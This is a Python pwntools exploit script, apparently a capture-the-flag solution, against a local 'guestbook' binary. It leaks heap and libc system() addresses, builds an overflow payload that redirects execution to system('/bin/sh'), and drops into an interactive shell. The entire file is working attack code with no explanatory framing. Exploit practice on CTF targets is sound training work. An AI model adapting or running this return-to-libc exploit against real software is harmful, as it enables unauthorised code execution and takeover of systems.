from pwn import*

TARGET = "./guestbook"
context.log_level = "debug"


def send_names(target_io):
  target_io.sendlineafter(b">>>", b"15935")
  target_io.sendlineafter(b">>>", b"75395")
  target_io.sendlineafter(b">>>", b"01593")
  target_io.sendlineafter(b">>>", b"25319")


def get_heap_addr_and_system_addr(target_io):
  target_io.sendlineafter(b">>", b"1")
  target_io.sendlineafter(b">>>", b"6")
  leak_bytes = target_io.recv(24)
  heap_addr = u32(leak_bytes[0:4])
  system_addr = u32(leak_bytes[20:24])
  return heap_addr, system_addr


def exec_bin_sh(target_io, heap_addr, system_addr):
  libc_elf = ELF("/lib/i386-linux-gnu/libc.so.6")
  bin_sh_offset = next(libc_elf.search(b"/bin/sh")) - \
      libc_elf.symbols["system"]
  bin_sh_addr = system_addr + bin_sh_offset
  payload = b"0" * 0x4
  payload += b"\x00"
  payload += b"1" * 0x5f
  payload += p32(0x0)
  payload += b"2" * 0x4
  payload += p32(heap_addr)
  payload += b"3" * 0x2c
  payload += p32(system_addr)
  payload += b"4" * 0x4
  payload += p32(bin_sh_addr)

  target_io.sendlineafter(b">>", b"2")
  target_io.sendlineafter(b">>>", b"0")
  target_io.sendlineafter(b">>>", payload)
  target_io.sendline(b"")
  target_io.sendlineafter(b">>", b"3")


def main():
  target_io = process(TARGET)

  send_names(target_io)
  heap_addr, system_addr = get_heap_addr_and_system_addr(target_io)
  exec_bin_sh(target_io, heap_addr, system_addr)
  target_io.interactive()


if __name__ == "__main__":
  main()
